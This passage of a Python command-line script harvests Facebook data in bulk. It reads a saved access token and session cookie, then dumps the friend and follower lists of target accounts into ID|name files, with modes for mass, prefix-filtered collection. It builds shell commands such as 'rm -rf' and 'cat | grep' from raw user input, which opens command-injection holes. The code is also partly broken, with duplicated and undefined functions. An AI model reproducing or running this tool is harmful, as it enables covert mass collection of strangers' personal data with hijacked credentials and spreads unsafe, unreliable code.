        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)
        
def follower():
    fbidz = []
    clear()
    global totaldmp,count
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .tokn.txt .cokis.txt')
        login()
    try:
        clear()
        try:
            fbbuid = input("Put Id Username: ")
            clear()
            dmp = requests.get("https://graph.facebook.com/"+fbbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            for idnm in dmp['friends']['data']:
                totaldmp+=1
                fbidz.append(idnm['id'])
        except KeyError:
            print(f"{A}ID Not Public");time.sleep(1)
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/SSN.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=subscribers.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['subscribers']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)

def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input('Put File Name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    clear()
    print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;37mExample: /sdcard/SSN.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 10008,10007,10006')
    print(47*'-')
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(47*'-')
    print('Links grabbed successfully')
    print('Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print('New file saved as: '+new_save)
    print(47*'-')
    input('Press enter to back Menu ')
    menu()
    
def cutter():
    os.system('clear')
    print(logo)
    print("Enter File Path / File Location \n")
    SSN = input('Put File Name :')
    print(" ")
    Suhbat = input('Saving Put File Name :')
    os.system('touch ' +Suhbat)
    os.system('sort -r '+SSN+' | uniq > '+Suhbat)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SSN )
    print(47*'-')
    print("File Saved To :" + Suhbat )
    print(47*'-')
    input(f"{S} Press Enter To Back SSN Menu ")
    menu
       

#------[ MAIN MENU ]--------->>
def menu():
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        nam = info['name']
        uid = info['id']
    except Exception as error:print ("\n\x1b[1;91m[*] Token Expired");slp(1);login()
    clear()
    print(f'Name : {nam} | ID : {uid}  ')
    print(47*"-")
    print(f'[1] Dump From Public [Simple]')
    print(f'[2] Dump From Public [Ultimated-auto-separate]')
    print(f'[3] Dump From Public [Ultimated]')
    print('[4] Dump From Follower [Ultimated]')
    print('[5] Remove Duplicate Links ')
    print('[6] Seprate Links ')
    print('[0] Remove Cookie ')
    print(47*"-")
    select = input('Select Menu: ')
    if select =='1':
        p_dump()
    elif select =='2':
        dump()
    elif select =='3':
        public()
    elif select =='4':
        follower()
    elif select =='5':
        cutter()
    elif select =='6':
        sids()
    elif select =='0':
        os.system('rm -rf .tokn.txt')
        os.system('rm -rf .cookis.txt')
        print(f'{F}Logout Successful');time.sleep(1)
        menu()
        
def push(fbuid,file,fbcokis,token,mission,typ):
    global filter,totaldmp
    try:
        if int(totaldmp)>=int(mission):
            filter = 'Closed'
        else:
            #and type in idnm['id']
            dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            print(f'\r Dumping : {fbuid}  IDs : {totaldmp}')
            for idnm in dmp['friends']['data']:
                if idnm['id'] not in filter:
                    if str(typ) in idnm['id']:
                        filter.append(idnm['id'])
                        open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                        totaldmp+=1
    except Exception as error:
        pass

def sent(file,fbcokis,token):
    global saved,totaldmp
    try:
        clear()
        print('How Many IDs You Want To Dump \nExample : 1000,5000,10000\n')
        mission = int(input('Enter limit: \x1b[1;92m'))
        clear()
        print('Which IDs You Want To Dump \nExample : 10008,100087,10007,mix\n')
        typ = input('Links: \x1b[1;97m')
        if 'mix' in typ.lower():
            typ = '1'
        clear()
        for fbuid in saved:
            fast_work(push,fbuid,file,fbcokis,token,mission,typ)
    except Exception as error:
        exit(f'----------------------------------------------------------\nTotal Dumped - {totaldmp} IDs \nSaved To = {file}\n----------------------------------------------------------')

def dump():
    global saved,totaldmp
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        login()
    except:
        login()
    try:
        print('Enter Dump ID Save Path\n')
        file = input('Enter File:\x1b[1;97m ')
        clear()
        print('IF You Want To Back To Menu. Then Type \'B\' \n')
        while True:
            try:
                fbuid = input('Put id username:\x1b[1;97m ')
                if 'B' in fbuid.upper():
                    menu()
                    break
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                    totaldmp+=1
                    saved.append(idnm['id'])
                print(f'Total Target Found:\x1b[1;97m {len(saved)}')
                slp(2)
                sent(file,fbcokis,token)
                break
                exit('Bye Bye')
            except:
                print('ID Not Public')
                continue
    except Exception as error:
        menu()

def p_dump():
    global totaldmp,srange
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}\n\t\tCookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}Cookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        clear()
        
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SSN.txt\n') 
        filepath = input("Put File Name: ")
        apnd = open(filepath , 'a')
        clear()
        for rept in range(srange):
            rept += 1
            sid = input("[" + str(rept) + "] Put id username: ")
            if  sid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
            print(f'{S}Total IDs : {totaldmp}')
        apnd.close()
        print(47*'-')
        print(f"Total IDs: {totaldmp} ")
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back SSN Menu ")
        SSN(allkey)
    except Exception as e:
        print("Error : %s"%e) 
        
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    SSN = input('Put File Name:')
    print(" ")
    Suhbat = input('Saving Put File Name:')
    os.system('touch ' +Suhbat)
    os.system('sort -r '+SSN+' | uniq > '+Suhbat)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + SSN )
    print("New File Saved:" + Suhbat )
    print(47*'-')
    input(f"{S} Press Enter To Back SSN Menu ")
    SSN(allkey)       
    
def removef():
        os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
        SSN(allkey)            
 

Suhbat()